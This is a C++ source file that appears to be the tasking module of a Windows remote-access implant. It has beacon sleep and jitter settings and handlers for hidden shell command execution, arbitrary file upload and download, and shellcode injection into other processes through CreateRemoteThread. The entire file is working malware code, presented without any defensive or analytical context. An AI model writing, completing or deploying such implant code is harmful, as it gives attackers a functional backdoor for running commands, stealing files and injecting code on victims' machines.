#include "tasks.h"
#include "shared/proto.h"

#include <windows.h>
#include <tlhelp32.h>

#include <cstdio>
#include <cstring>
#include <fstream>
#include <string>

namespace tasks {

uint32_t sleep_ms   = 60000;
uint32_t jitter_pct = 40;

static std::string RunShell(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
    HANDLE rd = nullptr, wr = nullptr;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return {};
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr;
    si.hStdError  = wr;
    si.hStdInput  = nullptr;

    PROCESS_INFORMATION pi{};
    std::string mutable_cmd = "cmd.exe /c " + cmd;
    BOOL ok = CreateProcessA(nullptr, &mutable_cmd[0], nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(wr);
    if (!ok) { CloseHandle(rd); return "[-] CreateProcess failed\n"; }

    std::string out;
    char buf[4096];
    DWORD read = 0;
    while (ReadFile(rd, buf, sizeof(buf), &read, nullptr) && read > 0)
        out.append(buf, read);

    WaitForSingleObject(pi.hProcess, 60000);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);

    CloseHandle(rd);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::string res;
    res.append(reinterpret_cast<const char*>(&code), 4);
    res += out;
    return res;
}

static bool ReadFileAll(const std::string& path, std::vector<uint8_t>& out) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return false;
    out.assign(std::istreambuf_iterator<char>(f), std::istreambuf_iterator<char>());
    return true;
}

static bool WriteFileAll(const std::string& path, const std::vector<uint8_t>& data) {
    std::ofstream f(path, std::ios::binary | std::ios::trunc);
    if (!f) return false;
    f.write(reinterpret_cast<const char*>(data.data()), std::streamsize(data.size()));
    return f.good();
}

static std::string Upload(const std::vector<uint8_t>& payload) {
    if (payload.size() < 2) return "[-] bad upload\n";
    uint16_t plen = uint16_t(payload[0]) | uint16_t(payload[1]) << 8;
    if (payload.size() < size_t(2 + plen)) return "[-] bad upload\n";
    std::string path(payload.begin() + 2, payload.begin() + 2 + plen);
    std::vector<uint8_t> data(payload.begin() + 2 + plen, payload.end());
    return WriteFileAll(path, data) ? "[+] upload ok\n" : "[-] upload failed\n";
}

static std::string Download(const std::vector<uint8_t>& payload) {
    if (payload.size() < 2) return "[-] bad download\n";
    uint16_t plen = uint16_t(payload[0]) | uint16_t(payload[1]) << 8;
    if (payload.size() < size_t(2 + plen)) return "[-] bad download\n";
    std::string path(payload.begin() + 2, payload.begin() + 2 + plen);
    std::vector<uint8_t> data;
    if (!ReadFileAll(path, data)) return "[-] open failed\n";
    return std::string(data.begin(), data.end());
}

static std::string Inject(const std::vector<uint8_t>& payload) {
    if (payload.size() < 5) return "[-] bad inject\n";
    DWORD pid = uint32_t(payload[0]) | uint32_t(payload[1]) << 8 |
                uint32_t(payload[2]) << 16 | uint32_t(payload[3]) << 24;
    std::vector<uint8_t> sc(payload.begin() + 4, payload.end());

    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!proc) return "[-] OpenProcess\n";

    LPVOID mem = VirtualAllocEx(proc, nullptr, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { CloseHandle(proc); return "[-] VirtualAllocEx\n"; }

    if (!WriteProcessMemory(proc, mem, sc.data(), sc.size(), nullptr)) {
        VirtualFreeEx(proc, mem, 0, MEM_RELEASE);
        CloseHandle(proc);
        return "[-] WriteProcessMemory\n";
    }

    DWORD old = 0;
    VirtualProtectEx(proc, mem, sc.size(), PAGE_EXECUTE_READ, &old);

    HANDLE th = CreateRemoteThread(proc, nullptr, 0,
                                   (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
    std::string out = th ? "[+] thread created\n" : "[-] CreateRemoteThread\n";
    if (th) CloseHandle(th);

    CloseHandle(proc);
    return out;
}

bool Execute(const Inbound& task, std::vector<uint8_t>& result) {
    std::string cmd, r;
    switch (proto::Op(task.op)) {
        case proto::Op::Shell:
            cmd.assign(task.payload.begin(), task.payload.end());
            r = RunShell(cmd);
            result.assign(r.begin(), r.end());
            return true;

        case proto::Op::Upload:
            r = Upload(task.payload);
            result.assign(r.begin(), r.end());
            return true;

        case proto::Op::Download:
            r = Download(task.payload);
            result.assign(r.begin(), r.end());
            return true;

        case proto::Op::Inject:
            r = Inject(task.payload);
            result.assign(r.begin(), r.end());
            return true;

        case proto::Op::Sleep:
            if (task.payload.size() >= 8) {
                sleep_ms = uint32_t(task.payload[0]) | uint32_t(task.payload[1]) << 8 |
                           uint32_t(task.payload[2]) << 16 | uint32_t(task.payload[3]) << 24;
                jitter_pct = uint32_t(task.payload[4]) | uint32_t(task.payload[5]) << 8 |
                             uint32_t(task.payload[6]) << 16 | uint32_t(task.payload[7]) << 24;
            }
            result.assign("ok", 2);
            return true;

        case proto::Op::Exit:
            ExitProcess(0);

        default:
            return false;
    }
}

}